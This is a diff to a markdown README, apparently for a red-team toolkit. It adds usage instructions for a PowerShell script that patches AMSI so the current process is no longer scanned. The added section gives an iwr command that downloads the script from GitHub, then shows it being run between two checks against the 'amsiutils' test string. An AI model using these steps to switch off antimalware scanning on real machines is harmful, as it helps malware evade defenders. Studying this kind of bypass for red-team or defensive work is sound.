@@ -104,3 +104,30 @@ amsiutils
 #Test detection
 amsiutils
 ```   
+
+## patch-amsi-x64-powershell.ps1
+   
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[patch-amsi-x64-powershell](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/patch-amsi-x64-powershell.ps1)|disable AMSI within current process|User Land|Available for x64 bytes only|
+
+<br />
+
+**downloadcmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/patch-amsi-x64-powershell.ps1" -OutFile "patch-amsi-x64-powershell.ps1"
+```
+
+<br />
+
+**execute:**
+```powershell
+#Test detection
+"amsiutils"
+
+#Patch amsi scan function
+.\patch-amsi-x64-powershell.ps1
+
+#Test detection
+"amsiutils"
+```  
